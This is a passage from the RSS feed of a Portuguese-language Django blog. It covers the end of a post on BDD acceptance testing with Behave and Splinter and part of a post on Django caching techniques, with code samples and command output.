    User&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;create_superuser&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;username&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;test&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; email&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;foo@bar&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; password&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;test&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    br &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser
    br&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;visit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;base_url &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/admin/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    br&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fill&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;username&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;test&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    br&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;fill&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;password&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;test&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    br&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;find_by_css&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;.submit-row input&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;first&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;click&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O código acima é simples e objetivo. Através do &lt;em&gt;decorator&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;@given&lt;/code&gt; associamos um determinado
pedaço de código &lt;em&gt;Python&lt;/em&gt; a um trecho das histórias escritas em &lt;code class=&quot;language-text&quot;&gt;.feature&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Rodando o &lt;code class=&quot;language-text&quot;&gt;behave&lt;/code&gt;, teremos uma saída similar a essa:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py behave

Creating test database for alias &amp;#39;default&amp;#39;...
Feature: Logged in page # features/home-logada.feature:1

    Scenario: Access index page    # features/home-logada.feature:3
    Given an authenticated user    # features/steps/auth.py:5 0.646s
    When I access the home page    # None
    Then I see my username printed # None&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;O motor de testes, além de identificar e executar o trecho de código necessário
para contemplar uma expressão, exibe o tempo de execução da mesma.&lt;/p&gt;
&lt;h2&gt;Quando alguma coisa acontece&lt;/h2&gt;
&lt;p&gt;Vamos para a parte onde o usuário interage com a aplicação.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# features/steps/actions.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; behave &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; when


&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@when&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;I access the home page&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;access_the_home_page&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    br &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser
    br&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;visit&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;base_url &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Aqui começa a ficar mais evidente o funcionamento de &lt;em&gt;steps&lt;/em&gt;. Se amanhã
eu precisar de um novo cenário onde é necessário acessar a página inicial,
eu posso aproveitar o &lt;code class=&quot;language-text&quot;&gt;when&lt;/code&gt; criado acima. O &lt;em&gt;Behave&lt;/em&gt; fará isso automaticamente
para você... Portanto, organizar os &lt;em&gt;steps&lt;/em&gt; de uma forma que eles agrupem
um determinado grupo de ações é uma sugestão interessante.&lt;/p&gt;
&lt;h2&gt;Então eu espero algum resultado&lt;/h2&gt;
&lt;p&gt;E para finalizar o nosso exemplo, vamos para o &lt;em&gt;decorator&lt;/em&gt; de &lt;code class=&quot;language-text&quot;&gt;@then&lt;/code&gt;,
que é o passo onde validamos o resultado dos acontecimentos disparados por &lt;code class=&quot;language-text&quot;&gt;@when&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# features/steps/results.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; behave &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; then


&lt;span class=&quot;token decorator annotation punctuation&quot;&gt;@then&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;I see my username printed&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;see_my_username&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;context&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    br &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; context&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;browser
    body &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; br&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;find_by_css&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;body&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;Hello test!&apos;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; body&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Pronto! Executamos nossas &lt;em&gt;specs&lt;/em&gt; e temos o seguinte resultado:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py behave

Creating test database for alias &amp;#39;default&amp;#39;...
Feature: Logged in page # features/home-logada.feature:1

    Scenario: Access index page      # features/home-logada.feature:3
    Given an authenticated user    # features/steps/auth.py:5 0.654s
    When I access the home page    # features/steps/actions.py:4 0.888s
    Then I see my username printed # features/steps/results.py:4 0.075s

1 feature passed, 0 failed, 0 skipped
1 scenario passed, 0 failed, 0 skipped
3 steps passed, 0 failed, 0 skipped, 0 undefined
Took 0m1.617s
Destroying test database for alias &amp;#39;default&amp;#39;...&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Garantimos através dos cenários acima que, dado um usuário logado,
imprimiremos o seu &lt;em&gt;username&lt;/em&gt; na rota &lt;code class=&quot;language-text&quot;&gt;http://localhost:8000/&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Behave&lt;/em&gt; é uma ótima ferramenta de &lt;em&gt;BDD&lt;/em&gt; para &lt;em&gt;Python&lt;/em&gt;. Sua integração
com o &lt;em&gt;Django&lt;/em&gt; e demais &lt;em&gt;frameworks&lt;/em&gt; é relativamente simples, o que só
aumenta a simpatia pela ferramenta.&lt;/p&gt;
&lt;p&gt;Já sofri muito com escrita de testes de aceitação com &lt;em&gt;Django&lt;/em&gt;. Não é
um veredicto, mas até o momento o sentimento é extremamente positivo em relação
ao casamento entre &lt;em&gt;Behave&lt;/em&gt; e &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima!&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://pythonhosted.org/behave/&quot;&gt;&lt;em&gt;Behave: Behavior-Driven Development, Python style&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/mixxorz/behave-django&quot;&gt;&lt;em&gt;GitHub: behave-django&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://splinter.readthedocs.org/en/latest/&quot;&gt;&lt;em&gt;Splinter: Tool for testing web applications using Python&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[Django e Cache: Uma dupla de alta performance - Parte 2]]></title><description><![CDATA[Continuando o post Django e Cache: Uma dupla de alta performance, vamos
ver na prática como utilizar o framework de cache do Django. Embora eu esteja utilizando o Memcached para escrever estes
artigos, vale ressaltar que a abstração do Django lhe permite utilizar
a ferramenta mais apropriada para…]]></description><link>https://klauslaube.com.br/2012/07/22/django-e-cache-uma-dupla-de-alta-performance-2.html</link><guid isPermaLink="false">https://klauslaube.com.br/2012/07/22/django-e-cache-uma-dupla-de-alta-performance-2.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Sun, 22 Jul 2012 14:33:58 GMT</pubDate><content:encoded>&lt;p&gt;Continuando o &lt;em&gt;post&lt;/em&gt; &lt;a href=&quot;/2012/06/17/django-e-cache-uma-dupla-de-alta-performance-1.html&quot; title=&quot;Leia a parte 1 deste artigo&quot;&gt;&lt;em&gt;Django&lt;/em&gt; e &lt;em&gt;Cache&lt;/em&gt;: Uma dupla de alta performance&lt;/a&gt;, vamos
ver na prática como utilizar o &lt;em&gt;framework&lt;/em&gt; de &lt;a href=&quot;/tag/cache.html&quot; title=&quot;Leia mais sobre Cache&quot;&gt;&lt;em&gt;cache&lt;/em&gt;&lt;/a&gt; do &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Embora eu esteja utilizando o &lt;a href=&quot;/tag/memcached.html&quot; title=&quot;Leia mais sobre Memcached&quot;&gt;&lt;em&gt;Memcached&lt;/em&gt;&lt;/a&gt; para escrever estes
artigos, vale ressaltar que a abstração do &lt;em&gt;Django&lt;/em&gt; lhe permite utilizar
a &lt;a href=&quot;https://docs.djangoproject.com/en/dev/topics/cache/#using-a-custom-cache-backend&quot; title=&quot;Django Documentation - Custom backends&quot;&gt;ferramenta mais apropriada para você&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Diferentes maneiras de “cachear” a aplicação&lt;/h2&gt;
&lt;p&gt;Podemos utilizar a camada de &lt;em&gt;cache&lt;/em&gt; em diferentes pontos da aplicação.
Por exemplo, podemos utilizá-la antes de uma consulta ao banco de dados,
armazenar resultados de operações complexas, armazenar o &lt;em&gt;parsing&lt;/em&gt; de um
&lt;em&gt;template&lt;/em&gt;, etc. Com o esquema de &lt;em&gt;middlewares&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;, podemos ter
essa camada aplicada diretamente ao fluxo de interpretação do
&lt;em&gt;framework&lt;/em&gt;, o que pode reduzir consideravelmente o uso de recursos de
nossa hospedagem, sem mesmo termos alterado código das nossas &lt;em&gt;apps&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos ver a diferença, e casos de usos, dessas formas de utilização do
&lt;em&gt;cache&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Granular&lt;/h3&gt;
&lt;p&gt;Quando você quer ser “incisivo”, utilizar a &lt;em&gt;API&lt;/em&gt; de forma “granular” é
uma ótima opção.&lt;/p&gt;
&lt;p&gt;Por exemplo, no &lt;a href=&quot;http://globoesporte.globo.com&quot; title=&quot;A melhor cobertura sobre o Futebol e Outros Esportes, no Brasil e no Mundo&quot;&gt;&lt;em&gt;Globoesporte.com&lt;/em&gt;&lt;/a&gt; nós fazemos algumas consultas a
um &lt;a href=&quot;http://virtuoso.openlinksw.com/&quot; title=&quot;Conheça o Virtuoso&quot;&gt;banco de dados semântico&lt;/a&gt; para trazer informações de eventos,
jogos e atletas. Como esta consulta é consideravelmente demorada,
utilizamos a &lt;em&gt;API&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; para melhorar os tempos de resposta.
Exemplo:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;core&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;cache &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; cache
&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;jogos_por_edicao&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;edicao_slug&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    jogos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; cache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;jogos_%s&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; edicao_slug&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;not&lt;/span&gt; jogos&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        jogos &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; pega_jogos_da_semantica&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;edicao_slug&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        cache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;set&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;jogos_%s&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; edicao_slug&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; jogos&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passamos ao &lt;code class=&quot;language-text&quot;&gt;cache.set&lt;/code&gt; uma chave (que deve ser menor que 250
caracteres, e não utilizar caracteres especiais) e um valor. Ele também
aceita um terceiro parâmetro, que é o tempo de vida desta informação em
&lt;em&gt;cache&lt;/em&gt;. Quando omitido, o tempo definido nas configurações do &lt;em&gt;backend&lt;/em&gt;
é utilizado.&lt;/p&gt;
&lt;p&gt;Para remover esta informação do &lt;em&gt;cache&lt;/em&gt;, basta utilizarmos o método
&lt;code class=&quot;language-text&quot;&gt;cache.delete&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;cache&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;delete&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;jogos_%s&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt; edicao_slug&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Você tem a liberdade de fazer &lt;em&gt;caching&lt;/em&gt; de qualquer região da sua
aplicação. Mas é bom tomarmos cuidado para que o gerenciamento desses
pontos não passem a ser um problema. O &lt;em&gt;framework&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; pode ser
aplicado em outras camadas da abstração, dispensando (em muitos casos) a
necessidade desse tipo de controle em modelos e &lt;em&gt;views&lt;/em&gt;.&lt;/p&gt;
&lt;h3&gt;Template&lt;/h3&gt;
&lt;p&gt;Assim como é possível fazer &lt;em&gt;caching&lt;/em&gt; de forma minuciosa com a &lt;em&gt;API&lt;/em&gt;
acima, é possível fazer um controle muito interessante de &lt;em&gt;cache&lt;/em&gt; com os
&lt;em&gt;templates&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;h4&gt;Prevenindo acesso a disco&lt;/h4&gt;
&lt;p&gt;A cada nova requisição, o &lt;em&gt;Django&lt;/em&gt; carrega o arquivo de &lt;em&gt;template&lt;/em&gt; do
disco, interpreta-o com o contexto, e retorna o seu resultado. Podemos
melhorar um pouquinho este fluxo, sem necessitar do &lt;em&gt;Memcached&lt;/em&gt;, basta
adicionarmos o &lt;code class=&quot;language-text&quot;&gt;django.template.loaders.cached.Loader&lt;/code&gt; ao
&lt;code class=&quot;language-text&quot;&gt;TEMPLATE_LOADERS&lt;/code&gt; do &lt;code class=&quot;language-text&quot;&gt;settings.py&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;TEMPLATE_LOADERS &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;django.template.loaders.cached.Loader&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;django.template.loaders.filesystem.Loader&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token string&quot;&gt;&apos;django.template.loaders.app_directories.Loader&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Esse &lt;em&gt;loader&lt;/em&gt; manterá o arquivo de &lt;em&gt;template&lt;/em&gt; em memória, evitando com
que o &lt;em&gt;Django&lt;/em&gt; tenha que recorrer ao disco para obter o seu conteúdo. O
“trade-off” é mais utilização da memória do seu servidor (que,
dependendo do cenário, nem é um problema tão grande assim) e a
necessidade de, quando houver atualizações em &lt;em&gt;templates&lt;/em&gt;, efetuar o
&lt;em&gt;restart&lt;/em&gt; do serviço de &lt;em&gt;WSGI&lt;/em&gt; que você utiliza.&lt;/p&gt;
&lt;p&gt;Outro ponto a se observar é que as &lt;em&gt;template tags&lt;/em&gt; que você utilizar
deverão ser &lt;a href=&quot;https://docs.djangoproject.com/en/dev/howto/custom-template-tags/#template-tag-thread-safety&quot; title=&quot;Leia mais na documentação do Django&quot;&gt;&lt;em&gt;thread-safe&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Prevenindo parsing desnecessário&lt;/h4&gt;
&lt;p&gt;O &lt;em&gt;framework&lt;/em&gt; de &lt;em&gt;cache&lt;/em&gt; permite “cachear” fragmentos de um &lt;em&gt;template&lt;/em&gt;.
Essa modalidade de &lt;em&gt;cache&lt;/em&gt; é bem interessante quando utilizamos filtros
ou &lt;em&gt;tags&lt;/em&gt; que executam operações que aumentam consideravelmente o tempo
de interpretação do &lt;em&gt;template&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Na &lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/cache/#template-fragment-caching&quot; title=&quot;Template fragment caching&quot;&gt;documentação&lt;/a&gt; há um exemplo bem interessante, onde é feito o
&lt;em&gt;cache&lt;/em&gt; de um &lt;em&gt;sidebar&lt;/em&gt; inteiro:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;django-html&quot;&gt;&lt;pre class=&quot;language-django-html&quot;&gt;&lt;code class=&quot;language-django-html&quot;&gt;{% load cache %}

{% cache 500 sidebar %}
    &amp;lt;!-- conteúdo do sidebar --&amp;gt;
{% endcache %}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Passamos para a &lt;em&gt;template tag&lt;/em&gt; &lt;code class=&quot;language-text&quot;&gt;cache&lt;/code&gt; o tempo de vida do conteúdo
(500 segundos), e o identificador deste conteúdo (&lt;code class=&quot;language-text&quot;&gt;sidebar&lt;/code&gt;). Se a
chave não existir, o &lt;em&gt;Django&lt;/em&gt; interpretará as instruções dentro do bloco
e armazenará o seu resultado no &lt;em&gt;Memcached&lt;/em&gt; para que, num próximo
acesso, esse resultado seja recuperado sem necessitar interpretar todo o
bloco novamente.&lt;/p&gt;
&lt;h3&gt;Views&lt;/h3&gt;
&lt;p&gt;Uma das maneiras mais práticas de utilizarmos o &lt;em&gt;cache&lt;/em&gt; em nossos
&lt;em&gt;websites&lt;/em&gt; e aplicações &lt;em&gt;Web&lt;/em&gt; escritos em &lt;em&gt;Django&lt;/em&gt;, é através do método
chamado &lt;a href=&quot;https://docs.djangoproject.com/en/1.4/topics/cache/#the-per-site-cache&quot; title=&quot;Leia mais sobre na documentação do Django&quot;&gt;&lt;em&gt;per-site cache&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Basicamente, o &lt;em&gt;Django&lt;/em&gt; analisará requisições realizadas através dos
métodos &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;HEAD&lt;/code&gt;, e utilizará a sua &lt;em&gt;URL&lt;/em&gt; como chave para a
verificação em &lt;em&gt;cache&lt;/em&gt;. Caso ele encontre a ocorrência, retornará ao
usuário o resultado “cacheado”, senão, interpretará a &lt;em&gt;view&lt;/em&gt; e ao final
armazenará o seu resultado.&lt;/p&gt;
&lt;p&gt;Para que isso seja possível, é necessário a utilização dos &lt;em&gt;middlewares&lt;/em&gt;
&lt;code class=&quot;language-text&quot;&gt;django.middleware.cache.UpdateCacheMiddleware&lt;/code&gt; e
&lt;code class=&quot;language-text&quot;&gt;django.middleware.cache.FetchFromCacheMiddleware&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;MIDDLEWARE_CLASSES &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;django.middleware.cache.UpdateCacheMiddleware&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;
    &lt;span class=&quot;token string&quot;&gt;&apos;django.middleware.cache.FetchFromCacheMiddleware&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Além da configuração das seguintes constantes:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;CACHE_MIDDLEWARE_ALIAS&lt;/code&gt; : O identificador da conexão (padrão
&lt;code class=&quot;language-text&quot;&gt;default&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;CACHE_MIDDLEWARE_SECONDS&lt;/code&gt; : O tempo de vida (em segundos) das
páginas em &lt;em&gt;cache&lt;/em&gt; (padrão &lt;code class=&quot;language-text&quot;&gt;600 segundos&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;CACHE_MIDDLEWARE_KEY_PREFIX&lt;/code&gt; : Chave para prevenir problemas
quando o &lt;em&gt;cache&lt;/em&gt; é um serviço compartilhado entre diferentes
instâncias &lt;em&gt;Django&lt;/em&gt;. Pode-se, por exemplo, colocar o nome do &lt;em&gt;site&lt;/em&gt;
como prefixo.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ao acessar as &lt;em&gt;views&lt;/em&gt;, temos uma agradável surpresa:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -I http://localhost:8000/

HTTP/1.0 200 OK
Date: Wed, 04 Jul 2012 00:12:17 GMT
Server: WSGIServer/0.1 Python/2.7.2
Cache-Control: max-age=600
Vary: Cookie
Expires: Wed, 04 Jul 2012 00:22:17 GMT
Content-Type: text/html; charset=utf-8
Last-Modified: Wed, 04 Jul 2012 00:12:17 GMT&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Ganhamos &lt;a href=&quot;/2012/05/14/o-cache-e-o-http.html&quot; title=&quot;O cache e o HTTP&quot;&gt;cabeçalhos &lt;em&gt;HTTP&lt;/em&gt;&lt;/a&gt; com os valores correspondentes às nossas
configurações de &lt;em&gt;cache&lt;/em&gt;! Por exemplo, &lt;code class=&quot;language-text&quot;&gt;Last-Modified&lt;/code&gt; corresponde a
data de acesso, &lt;code class=&quot;language-text&quot;&gt;Expires&lt;/code&gt; é a data de acesso acrescentando os 600
segundos de &lt;em&gt;cache&lt;/em&gt;, e o &lt;code class=&quot;language-text&quot;&gt;Expires&lt;/code&gt; corresponde ao tempo de
